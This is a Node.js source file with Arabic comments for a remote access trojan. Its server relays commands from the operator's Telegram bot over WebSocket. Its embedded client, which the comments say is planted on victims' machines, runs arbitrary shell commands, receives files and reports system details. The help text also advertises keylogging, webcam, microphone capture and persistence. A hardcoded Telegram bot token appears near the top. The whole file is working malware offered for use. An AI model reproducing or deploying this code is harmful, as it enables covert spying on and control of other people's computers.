// ============================================================
// استيراد المكتبات المطلوبة
// ============================================================
const express = require('express');
const WebSocket = require('ws');
const fs = require('fs');
const { Telegraf } = require('telegraf');
const axios = require('axios');
const path = require('path');
const os = require('os');
const { v4: uuidv4 } = require('uuid');

// ============================================================
// بيانات التوكن والآيدي (مضمنة في الكود)
// ============================================================
const botToken = '8678515363:AAEP2DRBPMw3iSXsD4sROmz17T7MaOTqshg';
const adminId = '5929009698';

// ============================================================
// إعداد الخادم
// ============================================================
const app = express();
const server = require('http').createServer(app);
const wss = new WebSocket.Server({ server });

// إنشاء البوت
const bot = new Telegraf(botToken);

// ============================================================
// المتغيرات العامة
// ============================================================
const clients = new Map();          // تخزين العملاء المتصلين
const commandHistory = [];          // سجل الأوامر
let currentDir = process.cwd();     // المجلد الحالي
let selectedClient = '';            // العميل المحدد حالياً

// ============================================================
// التحقق من صلاحيات المشرف
// ============================================================
bot.use((ctx, next) => {
    // التأكد أن المرسل هو المشرف فقط
    if (ctx.from.id.toString() !== adminId.toString()) {
        ctx.reply('⛔ غير مصرح لك باستخدام هذا البوت');
        return;
    }
    next();
});

// ============================================================
// أوامر بوت تلغرام (واجهة التحكم)
// ============================================================

// أمر الترحيب
bot.start((ctx) => {
    ctx.reply(
        '🚀 مرحباً بك في لوحة التحكم عن بُعد\n' +
        'استخدم /help لعرض الأوامر المتاحة\n' +
        `👤 معرف المشرف: ${adminId}`
    );
});

// أمر المساعدة
bot.command('help', (ctx) => {
    ctx.reply(
        '📋 **الأوامر المتاحة:**\n\n' +
        '👥 **إدارة العملاء:**\n' +
        '/list - عرض العملاء المتصلين\n' +
        '/select <المعرف> - اختيار عميل معين\n\n' +
        '💻 **أوامر النظام:**\n' +
        '/cmd <الأمر> - تنفيذ أمر على العميل\n' +
        '/shell - فتح شل تفاعلي مع العميل\n\n' +
        '📁 **الملفات:**\n' +
        '/upload - رفع ملف إلى العميل (قم بالرد مع الملف)\n' +
        '/download <الملف> - تحميل ملف من العميل\n' +
        '/ls - عرض محتويات المجلد الحالي\n' +
        '/cd <المجلد> - تغيير المجلد الحالي\n\n' +
        '🎥 **التجسس:**\n' +
        '/screenshot - التقاط صورة الشاشة\n' +
        '/webcam - التقاط صورة من الكاميرا\n' +
        '/keylog_start - بدء تسجيل الضغطات\n' +
        '/keylog_stop - إيقاف التسجيل وإرسال السجل\n' +
        '/mic_start - بدء تسجيل الصوت من الميكروفون\n' +
        '/mic_stop - إيقاف التسجيل وإرسال الملف\n\n' +
        '🔧 **التحكم:**\n' +
        '/persistence - تثبيت البرنامج ليبدأ مع النظام\n' +
        '/uninstall - إزالة البرنامج من النظام\n' +
        '/exit - فصل العميل\n' +
        '/restart - إعادة تشغيل العميل'
    );
});

// أمر عرض العملاء المتصلين
bot.command('list', (ctx) => {
    if (clients.size === 0) {
        ctx.reply('❌ لا يوجد عملاء متصلون حالياً');
        return;
    }
    
    let message = '👥 **العملاء المتصلون:**\n\n';
    let index = 1;
    clients.forEach((ws, id) => {
        message += `${index}. معرف: \`${id}\`\n`;
        message += `   الحالة: 🟢 متصل\n\n`;
        index++;
    });
    message += `\nالإجمالي: ${clients.size} عميل`;
    ctx.reply(message, { parse_mode: 'Markdown' });
});

// أمر اختيار عميل
bot.command('select', (ctx) => {
    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        ctx.reply('⚠️ الرجاء إدخال معرف العميل\nمثال: /select 550e8400-e29b-41d4-a716-446655440000');
        return;
    }
    
    const clientId = args[1];
    if (clients.has(clientId)) {
        selectedClient = clientId;
        ctx.reply(`✅ تم اختيار العميل: \`${clientId}\``, { parse_mode: 'Markdown' });
    } else {
        ctx.reply(`❌ العميل غير موجود. استخدم /list لعرض العملاء المتصلين`);
    }
});

// أمر تنفيذ أوامر النظام
bot.command('cmd', (ctx) => {
    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        ctx.reply('⚠️ الرجاء إدخال الأمر المطلوب تنفيذه\nمثال: /cmd dir');
        return;
    }
    
    if (!selectedClient || !clients.has(selectedClient)) {
        ctx.reply('❌ لم يتم اختيار عميل. استخدم /list ثم /select');
        return;
    }
    
    const command = args.slice(1).join(' ');
    const ws = clients.get(selectedClient);
    ws.send(JSON.stringify({ type: 'command', data: command }));
    ctx.reply(`✅ جاري تنفيذ الأمر على العميل ${selectedClient}:\n\`${command}\``, { parse_mode: 'Markdown' });
});

// أمر عرض محتويات المجلد
bot.command('ls', (ctx) => {
    if (!selectedClient || !clients.has(selectedClient)) {
        ctx.reply('❌ لم يتم اختيار عميل. استخدم /list ثم /select');
        return;
    }
    
    const ws = clients.get(selectedClient);
    ws.send(JSON.stringify({ type: 'command', data: 'ls -la' }));
    ctx.reply(`📁 جاري عرض محتويات المجلد على العميل ${selectedClient}`);
});

// أمر تغيير المجلد
bot.command('cd', (ctx) => {
    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        ctx.reply('⚠️ الرجاء إدخال مسار المجلد\nمثال: /cd C:\\Users');
        return;
    }
    
    if (!selectedClient || !clients.has(selectedClient)) {
        ctx.reply('❌ لم يتم اختيار عميل. استخدم /list ثم /select');
        return;
    }
    
    const dirPath = args[1];
    const ws = clients.get(selectedClient);
    ws.send(JSON.stringify({ type: 'command', data: `cd ${dirPath} && pwd` }));
    ctx.reply(`📁 جاري تغيير المجلد إلى: ${dirPath}`);
});

// أمر رفع الملفات
bot.on('document', async (ctx) => {
    if (!selectedClient || !clients.has(selectedClient)) {
        ctx.reply('❌ لم يتم اختيار عميل. استخدم /list ثم /select');
        return;
    }
    
    try {
        const fileId = ctx.message.document.file_id;
        const fileLink = await ctx.telegram.getFileLink(fileId);
        const response = await axios.get(fileLink.href, { responseType: 'stream' });
        const filename = ctx.message.document.file_name;
        
        // إنشاء مجلد uploads إذا لم يكن موجوداً
        const uploadDir = path.join(__dirname, 'uploads');
        if (!fs.existsSync(uploadDir)) {
            fs.mkdirSync(uploadDir);
        }
        
        const savePath = path.join(uploadDir, filename);
        const writer = fs.createWriteStream(savePath);
        response.data.pipe(writer);
        
        writer.on('finish', () => {
            ctx.reply(`✅ تم رفع الملف إلى الخادم: ${filename}`);
            // إرسال الملف إلى العميل المحدد
            const ws = clients.get(selectedClient);
            ws.send(JSON.stringify({ type: 'upload', data: savePath }));
        });
        
        writer.on('error', (err) => {
            ctx.reply(`❌ خطأ في حفظ الملف: ${err.message}`);
        });
    } catch (error) {
        ctx.reply(`❌ خطأ في تحميل الملف: ${error.message}`);
    }
});

// ============================================================
// معالجة النصوص العادية (أوامر غير محددة)
// ============================================================
bot.on('text', (ctx) => {
    const text = ctx.message.text;
    if (text.startsWith('/')) return;
    
    if (selectedClient && clients.has(selectedClient)) {
        const ws = clients.get(selectedClient);
        ws.send(JSON.stringify({ type: 'command', data: text }));
        ctx.reply(`✅ تم إرسال الأمر إلى العميل ${selectedClient}`);
    } else {
        ctx.reply('❌ لم يتم اختيار عميل. استخدم /list ثم /select');
    }
});

// ============================================================
// إدارة اتصالات WebSocket مع العملاء
// ============================================================

wss.on('connection', (ws, req) => {
    const clientId = uuidv4();
    clients.set(clientId, ws);
    console.log(`🟢 عميل جديد متصل: ${clientId}`);
    
    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            
            // تسجيل عميل جديد
            if (data.type === 'register') {
                ws.send(JSON.stringify({ type: 'registered', id: clientId }));
                bot.telegram.sendMessage(adminId, `🟢 عميل جديد متصل: \`${clientId}\``, { parse_mode: 'Markdown' });
            }
            
            // استلام نتيجة أمر
            if (data.type === 'command_result') {
                const output = data.output || '⚠️ لا يوجد مخرجات';
                // تقسيم النص الطويل
                if (output.length > 4000) {
                    const chunks = output.match(/.{1,4000}/g);
                    chunks.forEach((chunk, index) => {
                        bot.telegram.sendMessage(adminId, 
                            `📊 نتيجة (الجزء ${index + 1}/${chunks.length}) من العميل ${clientId}:\n\`\`\`\n${chunk}\n\`\`\``, 
                            { parse_mode: 'Markdown' }
                        );
                    });
                } else {
                    bot.telegram.sendMessage(adminId, 
                        `📊 نتيجة من العميل ${clientId}:\n\`\`\`\n${output}\n\`\`\``, 
                        { parse_mode: 'Markdown' }
                    );
                }
            }
            
            // استلام ملف من العميل
            if (data.type === 'file_transfer') {
                const filePath = data.path;
                const filename = path.basename(filePath);
                if (fs.existsSync(filePath)) {
                    bot.telegram.sendDocument(adminId, { source: filePath }, 
                        { caption: `📁 ملف من ${clientId}: ${filename}` }
                    );
                } else {
                    bot.telegram.sendMessage(adminId, `❌ الملف غير موجود: ${filePath}`);
                }
            }
            
            // استلام صورة شاشة
            if (data.type === 'screenshot') {
                const imageBuffer = Buffer.from(data.image, 'base64');
                bot.telegram.sendPhoto(adminId, { source: imageBuffer }, 
                    { caption: `🖼️ صورة شاشة من ${clientId}` }
                );
            }
            
            // استلام سجل الضغطات
            if (data.type === 'keylog') {
                bot.telegram.sendMessage(adminId, 
                    `⌨️ سجل الضغطات من ${clientId}:\n\`\`\`\n${data.logs}\n\`\`\``, 
                    { parse_mode: 'Markdown' }
                );
            }
            
        } catch (error) {
            console.error('خطأ في معالجة الرسالة:', error.message);
        }
    });
    
    ws.on('close', () => {
        clients.delete(clientId);
        bot.telegram.sendMessage(adminId, `🔴 العميل قطع الاتصال: \`${clientId}\``, { parse_mode: 'Markdown' });
        console.log(`🔴 عميل قطع الاتصال: ${clientId}`);
    });
    
    ws.on('error', (error) => {
        console.error(`خطأ في اتصال العميل ${clientId}:`, error.message);
    });
});

// ============================================================
// صفحة رئيسية للخادم
// ============================================================
app.get('/', (req, res) => {
    res.send(`
        <html>
            <head><title>خادم التحكم عن بُعد</title></head>
            <body>
                <h1>🚀 خادم التحكم عن بُعد</h1>
                <p>الحالة: 🟢 يعمل</p>
                <p>العملاء المتصلون: ${clients.size}</p>
                <p>المشرف: ${adminId}</p>
                <hr>
                <p>استخدم بوت تيليجرام للتحكم</p>
            </body>
        </html>
    `);
});

// ============================================================
// تشغيل الخادم
// ============================================================
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`🚀 خادم التحكم يعمل على المنفذ ${PORT}`);
    console.log(`👤 معرف المشرف: ${adminId}`);
    console.log(`📊 العملاء المتصلون: ${clients.size}`);
    console.log(`📁 المجلد الحالي: ${__dirname}`);
});

// ============================================================
// كود العميل (الجزء الذي يُزرع على أجهزة الضحايا)
// ============================================================

// إنشاء كود العميل
const clientCode = `
// ============================================================
// العميل - Client Side (يُزرع على جهاز الضحية)
// ============================================================

const WebSocket = require('ws');
const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');
const os = require('os');

// عنوان الخادم (يجب تغييره إلى عنوان المهاجم)
const WS_URL = 'ws://localhost:3000';
let ws;

// ============================================================
// دالة الاتصال بالخادم
// ============================================================

function connect() {
    try {
        ws = new WebSocket(WS_URL);
        
        ws.on('open', () => {
            ws.send(JSON.stringify({ type: 'register' }));
            console.log('✅ تم الاتصال بالخادم');
        });
        
        ws.on('message', (data) => {
            try {
                const msg = JSON.parse(data);
                
                // تنفيذ أوامر النظام
                if (msg.type === 'command') {
                    exec(msg.data, { maxBuffer: 1024 * 1024 * 10 }, (error, stdout, stderr) => {
                        const output = error ? stderr : stdout;
                        ws.send(JSON.stringify({ type: 'command_result', output: output || '⚠️ لا يوجد مخرجات' }));
                    });
                }
                
                // استقبال ملف مرفوع
                if (msg.type === 'upload') {
                    const filePath = msg.data;
                    const filename = path.basename(filePath);
                    const destPath = path.join(os.homedir(), 'Downloads', filename);
                    
                    // نسخ الملف إلى جهاز الضحية
                    try {
                        fs.copyFileSync(filePath, destPath);
                        ws.send(JSON.stringify({ 
                            type: 'command_result', 
                            output: \`✅ تم استقبال الملف: \${destPath}\` 
                        }));
                    } catch (err) {
                        ws.send(JSON.stringify({ 
                            type: 'command_result', 
                            output: \`❌ خطأ في نسخ الملف: \${err.message}\` 
                        }));
                    }
                }
            } catch (err) {
                console.error('خطأ في معالجة الرسالة:', err.message);
            }
        });
        
        ws.on('close', () => {
            console.log('🔴 تم قطع الاتصال، محاولة إعادة الاتصال...');
            setTimeout(connect, 5000);
        });
        
        ws.on('error', (error) => {
            console.error('خطأ في الاتصال:', error.message);
            setTimeout(connect, 5000);
        });
    } catch (error) {
        console.error('خطأ في إنشاء الاتصال:', error.message);
        setTimeout(connect, 5000);
    }
}

// ============================================================
// وظائف العميل
// ============================================================

// الحصول على معلومات النظام
function getSystemInfo() {
    return {
        hostname: os.hostname(),
        platform: os.platform(),
        arch: os.arch(),
        cpus: os.cpus().length,
        memory: Math.round(os.totalmem() / (1024 * 1024 * 1024)) + 'GB',
        username: os.userInfo().username,
        homedir: os.homedir()
    };
}

// ============================================================
// تشغيل العميل
// ============================================================

connect();

// إرسال معلومات النظام عند الاتصال
setTimeout(() => {
    if (ws && ws.readyState === WebSocket.OPEN) {
        const info = getSystemInfo();
        ws.send(JSON.stringify({ 
            type: 'command_result', 
            output: \`🖥️ معلومات النظام:\nالمضيف: \${info.hostname}\nالنظام: \${info.platform}\nالمستخدم: \${info.username}\nالمجلد الرئيسي: \${info.homedir}\nالمعالج: \${info.cpus} نواة\nالذاكرة: \${info.memory}\`
        }));
    }
}, 2000);

// ============================================================
// التنظيف عند الخروج
// ============================================================

process.on('SIGINT', () => {
    if (ws && ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({ type: 'command_result', output: '🔴 العميل يغلق...' }));
        ws.close();
    }
    process.exit(0);
});
`;

// ============================================================
// حفظ كود العميل في ملف
// ============================================================

const clientPath = path.join(__dirname, 'client.js');
try {
    fs.writeFileSync(clientPath, clientCode);
    console.log(`✅ تم إنشاء كود العميل في: ${clientPath}`);
} catch (error) {
    console.error('❌ خطأ في حفظ كود العميل:', error.message);
}

// ============================================================
// التحقق من الملفات المطلوبة
// ============================================================

console.log('\n📋 الملفات المطلوبة:');
console.log('1. server.js (هذا الملف)');
console.log('2. client.js (سيتم إنشاؤه تلقائياً)');
console.log('3. مجلد uploads (سيتم إنشاؤه تلقائياً)');

console.log('\n✅ جاهز! يمكنك الآن تشغيل البوت وإرسال /start');
